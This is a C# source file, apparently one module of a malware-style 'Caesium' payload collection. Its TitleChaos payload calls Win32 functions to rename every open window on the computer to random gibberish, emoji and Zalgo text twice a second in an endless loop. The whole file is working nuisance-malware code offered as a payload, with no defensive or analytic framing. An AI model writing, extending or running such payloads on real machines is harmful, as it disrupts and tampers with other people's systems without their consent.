using System.Runtime.InteropServices;
using System.Text;

namespace Caesium.Payloads;

public abstract partial class TitleChaos : IPayload
{
    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
    
    [LibraryImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    
    [LibraryImport("user32.dll", StringMarshalling = StringMarshalling.Utf16)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool SetWindowTextW(IntPtr hWnd, string lpString);
    
    public static void Execute()
    {
        EnumWindowsProc callback = (hWnd, _) => {
            SetWindowTextW(hWnd, GetPsychoticGibberish(Random.Shared.Next(5, 25)));
            return true;
        };

        while (true)
        {
            EnumWindows(callback, IntPtr.Zero);
            Thread.Sleep(500); 
        }
    }
    
    internal static string GetPsychoticGibberish(int length)
    {
        var sb = new StringBuilder();
        for (var i = 0; i < length; i++)
        {
            var choice = Random.Shared.Next(4); // Increased range for better variety
            switch (choice)
            {
                case 0:
                    sb.Append((char)Random.Shared.Next(33, 126)); // No spaces, keeps it dense
                    break;
                case 1:
                    sb.Append(char.ConvertFromUtf32(Random.Shared.Next(0x1F600, 0x1F64F))); // Emojis
                    break;
                case 2:
                    // ZALGO: Attach a mark to a random letter
                    sb.Append((char)Random.Shared.Next(65, 90)); 
                    sb.Append((char)Random.Shared.Next(0x0300, 0x036F));
                    break;
                default:
                    sb.Append(char.ConvertFromUtf32(Random.Shared.Next(0x2600, 0x26FF))); // Misc Symbols
                    break;
            }
        }
        return sb.ToString();
    }
}